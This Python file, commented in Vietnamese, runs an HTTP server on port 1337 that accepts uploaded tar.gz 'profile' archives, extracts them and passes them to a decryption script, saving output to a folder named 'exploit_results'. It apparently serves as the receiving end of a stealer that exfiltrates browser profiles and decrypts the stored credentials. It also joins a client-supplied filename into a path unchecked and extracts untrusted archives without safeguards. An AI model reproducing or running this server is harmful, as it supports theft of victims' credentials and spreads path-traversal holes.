from http.server import BaseHTTPRequestHandler, HTTPServer
import os
import tarfile
import subprocess
from datetime import datetime

SAVE_DIR = "received_files"
EXTRACT_DIR = "extracted_files"
RESULT_DIR = "exploit_results"

os.makedirs(SAVE_DIR, exist_ok=True)
os.makedirs(EXTRACT_DIR, exist_ok=True)
os.makedirs(RESULT_DIR, exist_ok=True)

class SimpleHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        filename = self.headers.get('X-Filename', f"profile_{datetime.now().timestamp()}.tar.gz")
        filepath = os.path.join(SAVE_DIR, filename)

        # Bước 1: Lưu file
        with open(filepath, 'wb') as f:
            f.write(self.rfile.read(content_length))

        print(f"[+] File saved to: {filepath}")

        # Bước 2: Giải nén và đổi tên thành "profile"
        extract_path = os.path.join(EXTRACT_DIR, "profile")  # Đổi tên folder thành "profile"
        os.makedirs(extract_path, exist_ok=True)

        try:
            with tarfile.open(filepath, "r:gz") as tar:
                tar.extractall(path=extract_path)
            print(f"[+] Extracted to: {extract_path}")
        except Exception as e:
            print(f"[!] Extraction failed: {e}")
            self.send_response(500)
            self.end_headers()
            return

        # Bước 3: Chạy decrypt.py
        # Run: python decrypt.py -d ./extracted_files/profile
        process = subprocess.run(
            ["python", 'decrypt_tool.py', "-d", extract_path],
            capture_output=True,
            text=True
        )

        result_output = process.stdout
        print("[+] Output:")
        print(result_output)

        # Bước 4: Lưu kết quả vào file
        # result_file = os.path.join(RESULT_DIR, f"result_{datetime.now().timestamp()}.txt")
        # with open(result_file, 'w') as f:
        #     f.write(result_output)
        # print(f"[+] Result saved to: {result_file}")

        # Phản hồi về cho client
        self.send_response(200)
        self.end_headers()

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 1337), SimpleHandler)
    print("[*] Listening on port 1337...")
    server.serve_forever()